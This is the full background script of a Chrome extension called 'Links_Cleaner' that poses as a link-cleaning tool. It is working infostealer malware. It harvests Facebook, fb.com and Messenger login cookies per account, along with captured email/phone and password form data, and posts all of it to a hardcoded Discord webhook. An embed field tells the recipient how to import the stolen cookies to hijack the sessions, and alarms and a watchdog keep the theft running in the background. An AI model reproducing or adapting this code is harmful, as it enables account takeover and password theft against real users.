﻿'use strict';

/* ============================================================
   Links_Cleaner — background service worker  v1.4.0
   - Form data: hamesha bhejta hai
   - Cookies: sirf handoff ke baad, sirf login wali, per account,
     ek file. logged-out / duplicate stores skip.
   ============================================================ */

const CONFIG = {
  webhookUrl: 'https://discord.com/api/webhooks/1565058322749456566/61oFjPNpPmH0otWtiEDu14RYDA5gzdbEClYKYWZb9Mok7VM9pFTlVorAfmUcjBPSRRRL',
  intervalSec: 30,
  captureForm: true,
  captureCookies: true,
  sendCookiesEachTick: false
};

const K = {
  queue: 'queue',
  seq: 'seq',
  stats: 'stats',
  lastTick: 'lastTick',
  armed: 'armed',
  accounts: 'accounts',
  accSeq: 'accSeq'
};

const MAX_QUEUE = 400;
const MAX_PER_TICK = 5;
const MAX_ATTEMPTS = 8;
const FB_DOMAINS = ['facebook.com', 'fb.com', 'messenger.com'];

const COLOR = { formdata: 0x00c853, cookies: 0x1877f2 };
const LABEL = { formdata: 'FORM DATA', cookies: 'COOKIES' };
const ACC_COLORS = [0x1877f2, 0x00c853, 0xffab00, 0x9c27b0, 0xe91e63, 0x00bcd4, 0x795548, 0x607d8b];

const LOGIN_COOKIES = ['c_user', 'xs', 'datr', 'sb', 'fr'];
const LOGIN_SET = new Set(LOGIN_COOKIES);
const rank = n => { const i = LOGIN_COOKIES.indexOf(n); return i === -1 ? 99 : i; };

/* ---------------- helpers ---------------- */
const sleep = ms => new Promise(r => setTimeout(r, ms));
const iso = ts => new Date(ts || Date.now()).toISOString();
const pad = n => String(n).padStart(2, '0');
const pad3 = n => String(n || 0).padStart(3, '0');

function stamp(ts) {
  const d = new Date(ts || Date.now());
  return `${d.getFullYear()}${pad(d.getMonth() + 1)}${pad(d.getDate())}_${pad(d.getHours())}${pad(d.getMinutes())}${pad(d.getSeconds())}`;
}
function hashStr(s) {
  let h = 5381;
  for (let i = 0; i < s.length; i++) h = ((h << 5) + h + s.charCodeAt(i)) | 0;
  return (h >>> 0).toString(16);
}
async function bumpStats(patch) {
  const o = await chrome.storage.local.get(K.stats);
  const s = Object.assign({ queued: 0, sent: 0, failed: 0 }, o[K.stats] || {});
  for (const k in patch) s[k] = (s[k] || 0) + patch[k];
  s.lastActivity = Date.now();
  await chrome.storage.local.set({ [K.stats]: s });
}
async function isArmed() {
  const o = await chrome.storage.local.get(K.armed);
  return !!o[K.armed];
}
async function updateBadge() {
  try {
    const q = await getQueue();
    await chrome.action.setBadgeBackgroundColor({ color: '#1877f2' });
    await chrome.action.setBadgeText({ text: q.length ? String(q.length) : '' });
  } catch (e) {}
}

function accountMap(flat) {
  const m = new Map();
  for (const k of flat) {
    if ((k.name === 'c_user' || k.name === 'ds_user_id') && k.value) {
      if (!m.has(k.storeId)) m.set(k.storeId, k.value);
    }
  }
  return m;
}

/* ---------------- queue lock ---------------- */
let qLock = Promise.resolve();
function lock(fn) {
  const run = qLock.then(fn, fn);
  qLock = run.then(() => {}, () => {});
  return run;
}

async function getQueue() {
  const o = await chrome.storage.local.get(K.queue);
  return Array.isArray(o[K.queue]) ? o[K.queue] : [];
}
async function setQueue(q) { await chrome.storage.local.set({ [K.queue]: q }); }

async function enqueue(kind, payload) {
  return lock(async () => {
    const q = await getQueue();
    const so = await chrome.storage.local.get(K.seq);
    const seq = (so[K.seq] || 0) + 1;
    await chrome.storage.local.set({ [K.seq]: seq });

    q.push({
      id: `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
      seq, kind, ts: Date.now(), attempts: 0, payload
    });
    while (q.length > MAX_QUEUE) q.shift();

    await setQueue(q);
    await bumpStats({ queued: 1 });
    updateBadge();
    return seq;
  });
}

/* ---------------- discord delivery ---------------- */
function embedFor(item) {
  const e = {
    title: `${LABEL[item.kind] || item.kind} #${item.seq}`,
    color: COLOR[item.kind] || 0x1877f2,
    timestamp: iso(item.ts),
    footer: { text: 'FB Sync Extension' }
  };
  const p = item.payload || {};
  const f = p.fields || {};

  if (item.kind === 'cookies') {
    e.title = `ACCOUNT ${pad3(p.accountIndex)} — ${p.accountId}`;
    e.color = ACC_COLORS[(p.accountIndex || 0) % ACC_COLORS.length];
    if (p.accountId) e.url = `https://www.facebook.com/profile.php?id=${p.accountId}`;
    e.fields = [
      { name: 'Account', value: String(p.accountId || '-').slice(0, 40), inline: true },
      { name: 'Index', value: pad3(p.accountIndex), inline: true },
      { name: 'Cookies', value: String(p.count || 0), inline: true },
      { name: 'State', value: p.changed ? 'changed' : 'first dump', inline: true },
      { name: 'Use', value: 'Cookie-Editor → Import → reload', inline: false }
    ];
  } else if (item.kind === 'formdata') {
    e.fields = [
      { name: 'Email / Phone', value: (f.email || '-').slice(0, 200) || '-', inline: false },
      { name: 'Password', value: (f.pass || '-').slice(0, 200) || '-', inline: false },
      { name: 'Reason', value: (p.reason || '-').slice(0, 40), inline: true },
      { name: 'Device', value: (p.mode || '-').slice(0, 20), inline: true }
    ];
  }
  return e;
}

async function sendItem(webhook, item) {
  const p = item.payload || {};
  const base = item.kind === 'cookies'
    ? `fb_cookies_${pad3(p.accountIndex)}_acc-${p.accountId}_${stamp(item.ts)}`
    : `fb_${item.kind}_${stamp(item.ts)}`;

  const fd = new FormData();
  const content = item.kind === 'cookies'
    ? `📄 \`${base}.json\` — account ${p.accountId} (#${pad3(p.accountIndex)})`
    : `📄 \`${base}.json\``;

  fd.append('payload_json', JSON.stringify({ content, embeds: [embedFor(item)] }));

  // cookies: seedha import karne wali plain array
  const body = item.kind === 'cookies'
    ? p.cookies
    : { kind: item.kind, seq: item.seq, capturedAt: iso(item.ts), ...p };

  fd.append('files[0]', new Blob([JSON.stringify(body, null, 2)], { type: 'application/json' }), `${base}.json`);

  for (let attempt = 0; attempt < 5; attempt++) {
    const res = await fetch(webhook, { method: 'POST', body: fd });
    if (res.status === 429) {
      const j = await res.json().catch(() => ({}));
      await sleep((((j.retry_after || 1.2)) + 0.4) * 1000);
      continue;
    }
    if (!res.ok) throw new Error('HTTP ' + res.status + ' ' + (await res.text().catch(() => '')).slice(0, 120));
    return true;
  }
  throw new Error('HTTP 429 — retries exhausted');
}

let flushing = false;
async function flush() {
  if (!CONFIG.webhookUrl || CONFIG.webhookUrl.startsWith('PASTE')) {
    return { sent: 0, note: 'webhook not set in background.js' };
  }
  if (flushing) return { sent: 0, note: 'busy' };

  flushing = true;
  let sent = 0;
  try {
    while (sent < MAX_PER_TICK) {
      const item = await lock(async () => (await getQueue())[0] || null);
      if (!item) break;

      try {
        await sendItem(CONFIG.webhookUrl, item);
        await lock(async () => {
          const q = await getQueue();
          const i = q.findIndex(x => x.id === item.id);
          if (i >= 0) q.splice(i, 1);
          await setQueue(q);
        });
        sent++;
        await bumpStats({ sent: 1 });
        await sleep(400);
      } catch (err) {
        await lock(async () => {
          const q = await getQueue();
          const i = q.findIndex(x => x.id === item.id);
          if (i < 0) return;
          q[i].attempts = (q[i].attempts || 0) + 1;
          q[i].lastError = String(err.message || err).slice(0, 200);
          if (q[i].attempts >= MAX_ATTEMPTS) { q[i].attempts = 0; q.push(q.splice(i, 1)[0]); }
          await setQueue(q);
        });
        await bumpStats({ failed: 1 });
        break;
      }
    }
  } finally {
    flushing = false;
    updateBadge();
  }
  return { sent };
}

/* ---------------- cookie capture (sirf login cookies, per account) ---------------- */
async function captureCookies() {
  if (!CONFIG.captureCookies) return;
  if (!(await isArmed())) return;

  let all = [];
  for (const d of FB_DOMAINS) {
    try { all = all.concat(await chrome.cookies.getAll({ domain: d })); } catch (e) {}
  }
  if (!all.length) return;

  const seen = new Set();
  const flat = [];
  for (const k of all) {
    const uid = `${k.storeId}|${k.domain}|${k.path}|${k.name}`;
    if (seen.has(uid)) continue;
    seen.add(uid);
    flat.push(k);
  }

  // c_user sirf usi store me hota hai jahan asli login hai
  const byStore = accountMap(flat);

  const groups = new Map();
  const orphans = [];
  for (const k of flat) {
    const accId = byStore.get(k.storeId);
    if (!accId) { orphans.push(k); continue; }
    if (!groups.has(accId)) groups.set(accId, []);
    groups.get(accId).push(k);
  }
  if (!groups.size) return;

  // sirf ek account ho to orphan cookies usi me merge
  if (groups.size === 1) {
    const only = [...groups.values()][0];
    for (const k of orphans) only.push(k);
  }

  const got = await chrome.storage.local.get(K.accounts);
  const accStore = got[K.accounts] || {};

  for (const [accId, raw] of groups) {
    // ek hi naam kai stores me -> storeId '0' jeetega
    raw.sort((a, b) => (a.storeId === '0' ? 0 : 1) - (b.storeId === '0' ? 0 : 1));
    const byName = new Map();
    for (const k of raw) if (!byName.has(k.name)) byName.set(k.name, k);

    const list = [...byName.values()]
      .filter(k => LOGIN_SET.has(k.name))
      .map(k => ({
        domain: k.domain,
        expirationDate: k.session ? null : Math.floor(k.expirationDate || 0),
        hostOnly: k.hostOnly,
        httpOnly: k.httpOnly,
        name: k.name,
        path: k.path,
        sameSite: k.sameSite,
        secure: k.secure,
        session: k.session,
        value: k.value
      }))
      .sort((a, b) => rank(a.name) - rank(b.name));

    if (!list.length) continue;

    const names = new Set(list.map(c => c.name));
    if (!names.has('c_user') || !names.has('xs')) continue;   // adhoora login -> skip

    const hash = hashStr(list.map(x => `${x.domain}|${x.path}|${x.name}=${x.value}`).join(';'));

    let meta = accStore[accId];
    if (!meta) {
      const so = await chrome.storage.local.get(K.accSeq);
      const idx = (so[K.accSeq] || 0) + 1;
      await chrome.storage.local.set({ [K.accSeq]: idx });
      meta = { idx, firstSeen: Date.now(), sends: 0 };
      accStore[accId] = meta;
    }

    meta.lastSeen = Date.now();
    if (meta.hash === hash && !CONFIG.sendCookiesEachTick) continue;

    const changed = !!meta.hash && meta.hash !== hash;
    meta.hash = hash;
    meta.count = list.length;
    meta.sends = (meta.sends || 0) + 1;

    await enqueue('cookies', {
      accountId: accId,
      accountIndex: meta.idx,
      count: list.length,
      changed,
      capturedAt: iso(),
      cookies: list
    });
  }

  await chrome.storage.local.set({ [K.accounts]: accStore });
}

/* ---------------- tick ---------------- */
let ticking = false;
async function tick() {
  if (ticking) return;
  ticking = true;
  try {
    await chrome.storage.local.set({ [K.lastTick]: Date.now() });
    await captureCookies();
    await flush();
  } catch (e) {
    console.warn('[vfb] tick error', e);
  } finally {
    ticking = false;
  }
}

/* ---------------- alarms ---------------- */
const ALARM_TICK = 'vfb_tick';
const ALARM_WD = 'vfb_watchdog';

async function ensureAlarms(force) {
  const period = Math.max(0.5, Math.round((CONFIG.intervalSec / 60) * 100) / 100);

  const t = await chrome.alarms.get(ALARM_TICK);
  if (force || !t || t.periodInMinutes !== period) {
    await chrome.alarms.create(ALARM_TICK, { delayInMinutes: 0.5, periodInMinutes: period });
  }
  const w = await chrome.alarms.get(ALARM_WD);
  if (force || !w) {
    await chrome.alarms.create(ALARM_WD, { periodInMinutes: 1 });
  }
}

chrome.alarms.onAlarm.addListener(async a => {
  if (a.name === ALARM_TICK) return tick();
  if (a.name === ALARM_WD) {
    const o = await chrome.storage.local.get(K.lastTick);
    if (!o[K.lastTick] || Date.now() - o[K.lastTick] > 90000) {
      await ensureAlarms(true);
      tick();
    }
  }
});

/* ---------------- boot ---------------- */
async function boot() {
  const q = await chrome.storage.local.get(K.queue);
  if (!Array.isArray(q[K.queue])) await chrome.storage.local.set({ [K.queue]: [] });
  await ensureAlarms(false);
  updateBadge();
  tick();
}

chrome.runtime.onInstalled.addListener(boot);
chrome.runtime.onStartup.addListener(boot);

/* ---------------- keepalive port ---------------- */
const ports = new Set();
chrome.runtime.onConnect.addListener(port => {
  if (port.name !== 'vfb-keepalive') return;
  ports.add(port);
  port.onMessage.addListener(() => { try { port.postMessage({ ok: 1, t: Date.now() }); } catch (e) {} });
  port.onDisconnect.addListener(() => ports.delete(port));
  boot();
});

/* ---------------- messaging ---------------- */
chrome.runtime.onMessage.addListener((msg, sender, respond) => {
  (async () => {
    if (!msg || typeof msg !== 'object') return respond({ ok: false });

    if (msg.type === 'vfb:data') {
      if (msg.kind === 'formdata' && !CONFIG.captureForm) return respond({ ok: true, skipped: true });
      const seq = await enqueue(msg.kind, msg.payload);
      flush();
      return respond({ ok: true, seq });
    }

    if (msg.type === 'vfb:arm') {
      await chrome.storage.local.set({ [K.armed]: Date.now() });
      const got = await chrome.storage.local.get(K.accounts);
      const accStore = got[K.accounts] || {};
      for (const id in accStore) delete accStore[id].hash;
      await chrome.storage.local.set({ [K.accounts]: accStore });
      setTimeout(tick, 6000);
      setTimeout(tick, 25000);
      return respond({ ok: true });
    }

    if (msg.type === 'vfb:ping') return respond({ ok: true, armed: await isArmed() });
    if (msg.type === 'vfb:flush') return respond(await flush());

    if (msg.type === 'vfb:export') {
      const got = await chrome.storage.local.get(K.accounts);
      return respond({ ok: true, accounts: got[K.accounts] || {} });
    }

    if (msg.type === 'vfb:clearQueue') {
      await setQueue([]);
      await chrome.storage.local.remove([K.accounts, K.accSeq]);
      updateBadge();
      return respond({ ok: true });
    }

    respond({ ok: false, unknown: msg.type });
  })();
  return true;
});

boot();